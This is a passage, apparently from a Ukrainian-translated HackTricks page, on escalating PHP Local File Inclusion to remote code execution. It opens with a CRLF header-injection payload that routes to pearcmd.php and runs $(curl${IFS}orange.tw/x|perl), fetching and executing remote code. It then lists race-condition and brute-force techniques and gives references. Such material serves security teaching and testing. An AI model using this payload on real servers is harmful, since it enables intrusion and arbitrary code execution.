Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Через phpinfo() (file_uploads = on)

Якщо ви знайшли **Local File Inclusion** і файл, що показує **phpinfo()** з file_uploads = on, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Через compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Якщо ви знайшли **Local File Inclusion** і ви **can exfiltrate the path** тимчасового файлу, АЛЕ **сервер** **перевіряє**, чи **файл, що буде включений, має PHP marks**, ви можете спробувати **обійти цю перевірку** за допомогою цієї **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Через eternal waiting + bruteforce

Якщо ви можете зловживати LFI для **upload temporary files** і змусити сервер **hang** виконання PHP, ви тоді могли б **brute force імена файлів протягом годин**, щоб знайти тимчасовий файл:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### До Fatal Error

Якщо ви включите будь-який з файлів `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Потрібно включити той самий файл 2 рази, щоб викликати цю помилку).

**Я не знаю, наскільки це корисно, але можливо.**\
_Навіть якщо ви спричините PHP Fatal Error, тимчасові PHP-файли, що були завантажені, видаляються._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Посилання

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
